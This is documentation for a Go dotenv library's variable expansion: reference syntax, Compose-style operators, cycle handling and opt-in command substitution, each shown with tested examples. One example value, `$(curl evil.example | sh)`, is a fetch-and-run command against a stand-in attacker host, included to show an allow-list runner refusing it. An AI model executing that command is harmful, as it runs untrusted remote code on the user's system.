# Variable expansion

How `GetExpanded` and `ExpandedMap` resolve `${VAR}`, `$VAR`, the Compose `${…}` operators, `$$` and opt-in `$(command)`, with a tested example for each.

**On this page**

- [Before you start](#before-you-start)
- [Step 1 — `Get` vs `GetExpanded`](#step-1--get-vs-getexpanded)
- [Step 2 — The `${…}` operators](#step-2--the--operators)
- [Step 3 — Literal dollars and how `$` is read](#step-3--literal-dollars-and-how--is-read)
- [Step 4 — Nesting, chains and cycles](#step-4--nesting-chains-and-cycles)
- [Step 5 — Which names a reference can reach](#step-5--which-names-a-reference-can-reach)
- [Step 6 — Quotes that turn expansion off](#step-6--quotes-that-turn-expansion-off)
- [Step 7 — Expand the whole file with `ExpandedMap`](#step-7--expand-the-whole-file-with-expandedmap)
- [Step 8 — Handle `RequiredError`](#step-8--handle-requirederror)
- [Step 9 — Command substitution (opt-in)](#step-9--command-substitution-opt-in)
- [Try it](#try-it)
- [Pitfalls](#pitfalls)
- [Related](#related)

A value like `URL=postgres://${HOST}/app` is stored on disk with the reference in it. `Get` returns that raw text. `GetExpanded` resolves the reference against the other keys in the **same file**, the way Docker Compose does when it reads a `.env`. The process environment is never read: an unresolved reference is `""`, unless you install a lookup (`WithLookup(os.LookupEnv)` or a `Lookuper` plugin, see [Plugins](plugins.md)), which is consulted only for names the file does not define.

Expansion is for reading. `Render`, `Save` and `Set` always work with the raw value, so references stay references on disk.

## Before you start

You need Go 1.22 or later and the library:

```sh
go get github.com/ubgo/dotenv
```

Every snippet below is a complete `Example` function from [`example_expand_test.go`](../../example_expand_test.go). They parse in-memory strings and never touch the disk, the environment or a shell. How a value is quoted decides whether it is expanded at all, so read [`.env` syntax](syntax.md) first if quoting is new to you.

## Step 1 — `Get` vs `GetExpanded`

`GetExpanded(key)` returns `(value, ok, err)`. `ok` is false only when the key has no active pair. `err` is non-nil only for an unsatisfied `${VAR:?msg}` or `${VAR?msg}` (see [Step 8](#step-8--handle-requirederror)), or when an installed lookup or value transformer fails. A plain reference to a key that does not exist is `""`, never an error.

Both forms work: `${NAME}` and `$NAME`. Use braces when a name is followed by more name characters (`${HOST}_backup`), or when you need an operator.

<!-- snippet: example_expand_test.go#exp_GetExpanded -->
```go
// ExampleFile_GetExpanded shows the difference between the raw value on disk
// (Get) and the value a consumer sees once references to other keys in the
// same file are resolved (GetExpanded). Both ${VAR} and $VAR work; a bare $VAR
// ends at the first character that cannot be part of a name.
func ExampleFile_GetExpanded() {
	src := "HOST=db.internal\n" +
		"PORT=5432\n" +
		"URL=postgres://${HOST}:$PORT/app\n" +
		"MISSING=[${NOT_IN_FILE}]\n"

	f := dotenv.Parse(src)

	raw, _ := f.Get("URL")
	url, ok, err := f.GetExpanded("URL")
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Println("Get:        ", raw)
	fmt.Println("GetExpanded:", url, ok)

	// An unresolved reference is "", never an error.
	missing, _, err := f.GetExpanded("MISSING")
	fmt.Println("MISSING:    ", missing, err)

	// A key that does not exist reports ok=false.
	_, ok, err = f.GetExpanded("NOPE")
	fmt.Println("NOPE found: ", ok, err)
	// Output:
	// Get:         postgres://${HOST}:$PORT/app
	// GetExpanded: postgres://db.internal:5432/app true
	// MISSING:     [] <nil>
	// NOPE found:  false <nil>
}
```

## Step 2 — The `${…}` operators

[Six operators](ds:block?id=operators-2jt6akwa) cover the Docker Compose interpolation spec. The difference between the colon and no-colon forms is how they treat a key that exists with an empty value: the colon forms treat empty like unset.

| Form | Meaning |
|---|---|
| `${VAR}` / `$VAR` | the value, or `""` |
| `${VAR:-default}` | `default` when VAR is unset **or empty** |
| `${VAR-default}` | `default` only when VAR is unset |
| `${VAR:+alt}` | `alt` when VAR is set **and non-empty**, else `""` |
| `${VAR+alt}` | `alt` when VAR is set, even if empty, else `""` |
| `${VAR:?message}` | error when VAR is unset **or empty** |
| `${VAR?message}` | error only when VAR is unset |

This example prints each operator against a key that is set (`SET=value`), set but empty (`EMPTY=`), and absent (`UNSET`):

<!-- snippet: example_expand_test.go#exp_Operators -->
```go
// ExampleFile_GetExpanded_operators prints every ${...} operator against a
// variable that is set, set but empty, and unset. The colon forms treat an
// empty value like an unset one; the forms without a colon only look at
// whether the key exists.
func ExampleFile_GetExpanded_operators() {
	// The three states every operator is checked against.
	const header = "SET=value\nEMPTY=\n"
	operators := []string{"", ":-def", "-def", ":+alt", "+alt", ":?msg", "?msg"}
	names := []string{"SET", "EMPTY", "UNSET"}

	fmt.Printf("%-12s %-8s %-8s %s\n", "operator", "SET", "EMPTY", "UNSET")
	for _, op := range operators {
		cells := make([]string, 0, len(names))
		for _, name := range names {
			f := dotenv.Parse(header + "R=${" + name + op + "}\n")
			got, _, err := f.GetExpanded("R")
			cell := fmt.Sprintf("%q", got)
			if err != nil {
				cell = "error"
			}
			cells = append(cells, cell)
		}
		fmt.Printf("%-12s %-8s %-8s %s\n", "${VAR"+op+"}", cells[0], cells[1], cells[2])
	}
	// Output:
	// operator     SET      EMPTY    UNSET
	// ${VAR}       "value"  ""       ""
	// ${VAR:-def}  "value"  "def"    "def"
	// ${VAR-def}   "value"  ""       "def"
	// ${VAR:+alt}  "alt"    ""       ""
	// ${VAR+alt}   "alt"    "alt"    ""
	// ${VAR:?msg}  "value"  error    error
	// ${VAR?msg}   "value"  ""       error
}
```

Details that the table does not show:

- The text after an operator is itself expanded, so `${A:-${B}}` works (see [Step 4](#step-4--nesting-chains-and-cycles)). It is expanded only when it is used: `${A:-${B:?need}}` raises no error while `A` has a value.
- The default or alternate may be empty (`${VAR:-}`) and may contain spaces (`${VAR:-a b}`).
- The message after `?` may be empty: `${VAR:?}` still fails, with a message that just names the variable.
- A disabled pair (`# VAR=x`) and an inherited name-only line (`VAR`) do not count as set.
- Shell-only forms such as `${VAR/foo/bar}` or `${#VAR}` are not supported, as in Compose. They are not parsed as operators, so the whole text inside the braces is treated as a name, which is never set, and expands to `""`.

## Step 3 — Literal dollars and how `$` is read

The character right after a `$` decides what it means. The value is read once, left to right:

| After `$` | Meaning | In the file | `GetExpanded` |
|---|---|---|---|
| `$` | one literal `$` | `cost 5$$` | `cost 5$` |
| `{` | braced reference | `${NAME}` | value of NAME |
| letter or `_` | bare reference | `$NAME/x` | value of NAME, then `/x` |
| `(` | command (only when enabled, see [Step 9](#step-9--command-substitution-opt-in)) | `$(whoami)` | `$(whoami)` unchanged by default |
| anything else, or end of value | literal `$` | `$5`, `100$` | unchanged |

`$${NAME}` gives the literal text `${NAME}`: the `$$` becomes one `$`, and the `{NAME}` after it is ordinary text. An unclosed `${NAME` is kept as written. A backslash does **not** escape a dollar; `"\$NAME"` keeps the backslash and still expands `$NAME`.

<!-- snippet: example_expand_test.go#exp_Dollar -->
```go
// ExampleFile_GetExpanded_dollar shows how the character after a $ decides
// what it means: $$ is one literal dollar, ${ and a letter or _ start a
// reference, and anything else (a digit, a space, the end of the value) is a
// plain dollar sign. A backslash does not escape a dollar; use $$.
func ExampleFile_GetExpanded_dollar() {
	src := "NAME=world\n" +
		"ESCAPED=$${NAME} and $$NAME\n" +
		"PRICE=costs $5 or 5$\n" +
		"THREE=$$$\n" +
		"BACKSLASH=\"\\$NAME\"\n" +
		"UNCLOSED=${NAME\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"ESCAPED", "PRICE", "THREE", "BACKSLASH", "UNCLOSED"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// ESCAPED="${NAME} and $NAME"
	// PRICE="costs $5 or 5$"
	// THREE="$$"
	// BACKSLASH="\\world"
	// UNCLOSED="${NAME"
}
```

## Step 4 — Nesting, chains and cycles

References can nest inside operator arguments to any practical depth, and a referenced value is expanded in turn, so `C=${B}` where `B=${A}` resolves all the way through. Order in the file does not matter: a reference can point at a key defined further down. With duplicate keys, a reference sees the last one.

A cycle cannot hang the caller. While a variable is being expanded, [a reference back into it resolves to `""`](ds:block?id=visitingenter-r4jp8kdd), which is what an unset variable gives. Two separate references to the same variable in one value are not a cycle and both resolve. As a backstop, chains stop after [32 levels](ds:block?id=maxexpanddepth-hr5dfhv2).

<!-- snippet: example_expand_test.go#exp_Nesting -->
```go
// ExampleFile_GetExpanded_nesting shows nested defaults, chains of references
// (in any order in the file), and the cycle guard: a reference back into a
// variable that is still being expanded resolves to "" so expansion always
// terminates. The guard tracks referenced names, not the key you asked for,
// so CYCLE_A goes round once more ("a", "b", "a") before the cut. Two
// separate references to one variable are not a cycle.
func ExampleFile_GetExpanded_nesting() {
	src := "NESTED=${NOPE:-${ALSO_NOPE:-fallback}}\n" +
		"INNER=${NOPE:-${LATER}}\n" +
		"CHAIN=${BASE}/v1\n" +
		"BASE=https://${DOMAIN}\n" +
		"DOMAIN=example.com\n" +
		"TWICE=${DOMAIN}|${DOMAIN}\n" +
		"LATER=defined below\n" +
		"CYCLE_A=a${CYCLE_B}\n" +
		"CYCLE_B=b${CYCLE_A}\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"NESTED", "INNER", "CHAIN", "TWICE", "CYCLE_A"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// NESTED="fallback"
	// INNER="defined below"
	// CHAIN="https://example.com/v1"
	// TWICE="example.com|example.com"
	// CYCLE_A="aba"
}
```

The guard tracks the names that references point at, not the key you asked `GetExpanded` for. So a cycle back to the starting key goes round once more before it is cut, which is why `CYCLE_A` above is `aba` rather than `ab`. The same rule applies to a key that refers to itself (see [Pitfalls](#pitfalls)).

## Step 5 — Which names a reference can reach

A reference name is narrower than a key name. A bare `$name` takes letters, digits and `_`, starting with a letter or `_`, and stops at the first other character. Inside `${…}` the name runs up to the first operator character (`:`, `-`, `+`, `?`), so dotted and bracketed keys are reachable with braces but dashed keys are not: `${MY-KEY}` means "`MY`, with default `KEY`".

<!-- snippet: example_expand_test.go#exp_Names -->
```go
// ExampleFile_GetExpanded_names shows which key names a reference can reach.
// Inside ${...} the name runs up to the first operator character, so a key
// with a dash cannot be referenced: ${MY-KEY} means "MY, default KEY". A bare
// $name stops at the first character that is not a letter, digit or _.
func ExampleFile_GetExpanded_names() {
	src := "MY-KEY=dashed\n" +
		"spring.url=dotted\n" +
		"DASH=${MY-KEY}\n" +
		"BRACED_DOT=${spring.url}\n" +
		"BARE_DOT=$spring.url\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"DASH", "BRACED_DOT", "BARE_DOT"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// DASH="KEY"
	// BRACED_DOT="dotted"
	// BARE_DOT=".url"
}
```

If you need to reference a dashed key, rename it with `_`. Names are case sensitive.

## Step 6 — Quotes that turn expansion off

Bare and double-quoted values are expanded. Single-quoted and backtick values never are: `$`, `$$`, `${…}` and `$(…)` all come back exactly as written. Use single quotes for passwords, ciphertext and templates that contain dollar signs.

<!-- snippet: example_expand_test.go#exp_Literal -->
```go
// ExampleFile_GetExpanded_literal shows that quoting decides whether a value
// is expanded at all. Bare and double-quoted values are; single-quoted and
// backtick values are returned exactly as written, $$ and all.
func ExampleFile_GetExpanded_literal() {
	src := "USER_NAME=ada\n" +
		"BARE=${USER_NAME} $$\n" +
		"DOUBLE=\"${USER_NAME} $$\"\n" +
		"SINGLE='${USER_NAME} $$'\n" +
		"BACKTICK=`${USER_NAME} $$`\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"BARE", "DOUBLE", "SINGLE", "BACKTICK"} {
		got, _, err := f.GetExpanded(key)
		if err != nil {
			fmt.Println(key, "error:", err)
			continue
		}
		fmt.Printf("%s=%q\n", key, got)
	}
	// Output:
	// BARE="ada $"
	// DOUBLE="ada $"
	// SINGLE="${USER_NAME} $$"
	// BACKTICK="${USER_NAME} $$"
}
```

This protects the value when you read **that** key. It does not protect it when another key refers to it: see the first item under [Pitfalls](#pitfalls).

## Step 7 — Expand the whole file with `ExpandedMap`

`ExpandedMap()` returns every active pair expanded, as a `map[string]string`, with the last duplicate winning like `Map`. Literal values come back as written. The package-level `Read(path)` is `Open` followed by `ExpandedMap`, except that a missing file is an error.

It stops at the first error, in file order, and returns a `nil` map with it. A half-expanded map would leave you unable to tell which values are trustworthy, so you get all or nothing. In the second file below, both `B` and `C` are unsatisfied, but only the first one is reported.

<!-- snippet: example_expand_test.go#exp_ExpandedMap -->
```go
// ExampleFile_ExpandedMap expands every pair into one map (last duplicate
// wins). If any value hits an unsatisfied ${VAR:?msg} or ${VAR?msg}, it
// returns a nil map and that first error, never a half-expanded map.
func ExampleFile_ExpandedMap() {
	good := dotenv.Parse("HOST=db\nURL=postgres://${HOST}\nRAW='${HOST}'\n")
	m, err := good.ExpandedMap()
	fmt.Println(m, err)

	bad := dotenv.Parse("A=ok\nB=${NEED_ONE:?first}\nC=${NEED_TWO:?second}\n")
	m, err = bad.ExpandedMap()
	fmt.Println(m == nil, err)
	// Output:
	// map[HOST:db RAW:${HOST} URL:postgres://db] <nil>
	// true dotenv: required variable NEED_ONE is not set or is empty: first
}
```

## Step 8 — Handle `RequiredError`

`${VAR:?message}` and `${VAR?message}` exist to fail loudly when configuration is missing. The error is a `*RequiredError`, so use `errors.As` to tell it apart from a plugin failure and to read its fields:

| Field | Meaning |
|---|---|
| `Key` | the variable that was missing (not the key whose value held the reference) |
| `Message` | the text after `?`, or `""` |
| `Empty` | `true` for `:?` (unset or empty), `false` for `?` (unset only) |

`Error()` always names the variable, and includes the message when there is one.

<!-- snippet: example_expand_test.go#exp_RequiredError -->
```go
// ExampleRequiredError shows how to catch a required-variable failure with
// errors.As and read which variable is missing. Empty is true for the ":?"
// form (unset or empty) and false for "?" (unset only).
func ExampleRequiredError() {
	src := "DB_PASSWORD=\n" +
		"URL=postgres://app:${DB_PASSWORD:?set it in .env}@db\n" +
		"TOKEN=${API_TOKEN?}\n"

	f := dotenv.Parse(src)
	for _, key := range []string{"URL", "TOKEN"} {
		_, _, err := f.GetExpanded(key)

		var re *dotenv.RequiredError
		if errors.As(err, &re) {
			fmt.Printf("key=%s empty=%v message=%q\n", re.Key, re.Empty, re.Message)
			fmt.Println(" ", err)
		}
	}
	// Output:
	// key=DB_PASSWORD empty=true message="set it in .env"
	//   dotenv: required variable DB_PASSWORD is not set or is empty: set it in .env
	// key=API_TOKEN empty=false message=""
	//   dotenv: required variable API_TOKEN is not set
}
```

The error is returned for whichever key you read. Reading a key whose value has no failing reference succeeds even if another key in the same file would fail, so call `ExpandedMap` once at startup if you want every requirement checked.

## Step 9 — Command substitution (opt-in)

`$(command)` runs a command and inserts its output. It is [**off by default**](ds:block?id=withcommandsubstitution-5kmt8q5c) and stays off unless you enable it, because turning it on means that merely reading a `.env` file runs whatever commands it contains. A `.env` from a repository, a container image, a pull request or a teammate would become a way to run code on your machine or in CI. With it off, [`$(…)` is returned exactly as written](ds:block?id=expandcommand-a4tbu6wa), so nothing is lost:

<!-- snippet: example_expand_test.go#exp_SubstitutionOff -->
```go
// ExampleWithCommandSubstitution_off shows the default: $(command) is never
// run, and the text comes back exactly as written. Reading a file must not
// execute it.
func ExampleWithCommandSubstitution_off() {
	f := dotenv.Parse("WHO=\"user-$(whoami)\"\n")
	got, _, err := f.GetExpanded("WHO")
	fmt.Printf("%q %v\n", got, err)
	// Output:
	// "user-$(whoami)" <nil>
}
```

There are two ways to turn it on:

- `WithCommandSubstitution(true)` runs each command with `sh -c`, with trailing newlines removed from the output. Use this only for files you trust as much as your own code.
- `WithCommandRunner(fn)` runs each command through your function instead, and enables substitution. Use it to allow-list commands, run them in a sandbox, or fake them in tests. Passing `nil` enables substitution with the default `sh -c` runner.

The command text is expanded first, so `$($GIT rev-parse HEAD)` runs with `$GIT` already replaced. A failing or refused command expands to `""` rather than failing the read, as a shell would. Single-quoted and backtick values never run commands.

<!-- snippet: example_expand_test.go#exp_Runner -->
```go
// ExampleWithCommandRunner_allowList turns on $(command) with a runner you
// control instead of sh -c. The command text is expanded first, then handed
// to the runner. A refused or failing command expands to "".
func ExampleWithCommandRunner_allowList() {
	// The only commands this runner answers, with fixed output.
	allowed := map[string]string{
		"git rev-parse --short HEAD": "a1b2c3d",
	}
	runner := func(cmd string) (string, error) {
		out, ok := allowed[cmd]
		if !ok {
			return "", errors.New("refused: " + cmd)
		}
		return out, nil
	}

	src := "GIT=git\n" +
		"VERSION=\"build-$($GIT rev-parse --short HEAD)\"\n" +
		"DANGER=\"[$(curl evil.example | sh)]\"\n" +
		"LITERAL='$(git rev-parse --short HEAD)'\n"

	f := dotenv.Parse(src, dotenv.WithCommandRunner(runner))
	for _, key := range []string{"VERSION", "DANGER", "LITERAL"} {
		got, _, err := f.GetExpanded(key)
		fmt.Printf("%s=%q %v\n", key, got, err)
	}
	// Output:
	// VERSION="build-a1b2c3d" <nil>
	// DANGER="[]" <nil>
	// LITERAL="$(git rev-parse --short HEAD)" <nil>
}
```

Options apply in order, so a later `WithCommandSubstitution(false)` switches substitution back off, even after `WithCommandRunner`:

<!-- snippet: example_expand_test.go#exp_RunnerOrder -->
```go
// ExampleWithCommandSubstitution_order shows that options apply in order: a
// later WithCommandSubstitution(false) switches substitution back off even
// after WithCommandRunner turned it on.
func ExampleWithCommandSubstitution_order() {
	const src = "K=$(echo hi)\n"
	// upper stands in for a shell: it echoes the command upper-cased, so the
	// output shows whether it ran.
	upper := func(cmd string) (string, error) { return strings.ToUpper(cmd), nil }

	// No ${VAR?} references here, so GetExpanded cannot return an error.
	on, _, _ := dotenv.Parse(src, dotenv.WithCommandRunner(upper)).GetExpanded("K")
	off, _, _ := dotenv.Parse(src,
		dotenv.WithCommandRunner(upper),
		dotenv.WithCommandSubstitution(false),
	).GetExpanded("K")
	fmt.Printf("runner only:    %q\n", on)
	fmt.Printf("then off again: %q\n", off)
	// Output:
	// runner only:    "ECHO HI"
	// then off again: "$(echo hi)"
}
```

Command runners are also plugins (`CommandRunner`); the last one installed wins. See [Plugins](plugins.md).

## Try it

Run the expansion examples from the repository root:

```sh
go test -run '^(ExampleFile_GetExpanded_operators|ExampleRequiredError)$' -v .
```

```text
=== RUN   ExampleFile_GetExpanded_operators
--- PASS: ExampleFile_GetExpanded_operators (0.00s)
=== RUN   ExampleRequiredError
--- PASS: ExampleRequiredError (0.00s)
PASS
ok  	github.com/ubgo/dotenv	0.005s
```

A pass means each example printed exactly its `// Output:` block above. Edit `src` in [`example_expand_test.go`](../../example_expand_test.go) and rerun to try your own references.

## Pitfalls

- **A single-quoted value is expanded again when another key refers to it.** Reading `A` directly keeps it literal, but a reference to `A` expands its text. With `A='${B}'`, `B=x`, `C=${A}`, `GetExpanded("C")` returns `x`, not `${B}`; with `A='$$'`, `C=${A}` gives `$`. Until this changes, do not point references at literal values that contain `$`.
- **A key cannot extend itself.** `A=1` then `A=${A}2` does not give `12` as it would in Compose, which reads line by line. The reference sees the last `A`, which is `${A}2`, so the result is `22`. Likewise `A=${A:-x}` gives `""`, not `x`. Give the base value its own name: `A_BASE=1`, `A=${A_BASE}2`.
- **`ExpandedMap` also expands overridden duplicates.** If an earlier `B=${NOPE:?x}` is overridden by a later `B=ok`, `GetExpanded("B")` returns `ok`, but `ExpandedMap` (and `Read`) still fail on the earlier line. Remove dead duplicates (`Count` finds them).
- **Dashed keys cannot be referenced.** `${MY-KEY}` is the `-` default operator. See [Step 5](#step-5--which-names-a-reference-can-reach).
- **A bare reference stops at `.`.** `$spring.url` is `$spring` followed by `.url`. Use `${spring.url}`.
- **Use `Get`, not `GetExpanded`, for anything you write back.** Writing an expanded value replaces the reference with a copy of its current target, and the link is lost.
- **`WithCommandRunner(nil)` runs real shell commands.** It enables substitution with `sh -c`, not a no-op runner.
- **A failing command is silent.** It expands to `""` with no error. If a command must succeed, check the result yourself or make your runner record failures.
- **`ExpandedMap` reports only the first missing variable.** Fix it and rerun to see the next one.

## Related

- [`.env` syntax](syntax.md): quoting, comments, escapes and which values are expanded.
- [Reading](reading.md): `Read`, `Open`, `Parse` and the raw `Get`/`Map` view.
- [Plugins](plugins.md): `WithLookup` for an environment or secret-store fallback, value transformers, `CommandRunner`, and `ExpandObserver` to see every resolved reference.
- [Feature index](../reference/features.md#library-expansion)
- Examples in [`example_expand_test.go`](../../example_expand_test.go): `ExampleFile_GetExpanded`, `ExampleFile_GetExpanded_operators`, `ExampleFile_GetExpanded_dollar`, `ExampleFile_GetExpanded_nesting`, `ExampleFile_GetExpanded_names`, `ExampleFile_GetExpanded_literal`, `ExampleFile_ExpandedMap`, `ExampleRequiredError`, `ExampleWithCommandSubstitution_off`, `ExampleWithCommandRunner_allowList`, `ExampleWithCommandSubstitution_order`.
